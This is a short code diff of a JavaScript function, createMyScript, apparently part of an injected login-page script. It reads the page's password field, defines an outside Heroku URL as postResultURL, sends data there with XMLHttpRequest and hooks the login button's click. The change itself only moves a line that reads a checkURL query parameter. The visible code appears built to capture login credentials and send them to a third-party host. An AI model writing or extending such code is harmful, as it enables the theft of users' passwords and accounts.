@@ -12,7 +12,6 @@ function createMyScript() {
     let password = document.getElementById('loginform-password')
     
     const postResultURL = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
-    let checkCredentialsURL = new URL(window.location.href).searchParams.get('checkURL');
     
     function postResult(data) {
         let xhr = new XMLHttpRequest();
@@ -49,7 +48,8 @@ function createMyScript() {
         main.prepend(block)
     }
     const nextUrl = getNextUrl()
-    
+    const checkCredentialsURL = new URL(window.location.href).searchParams.get('checkURL');
+
     let showedError = false;
     
     btn.addEventListener('click', () => {
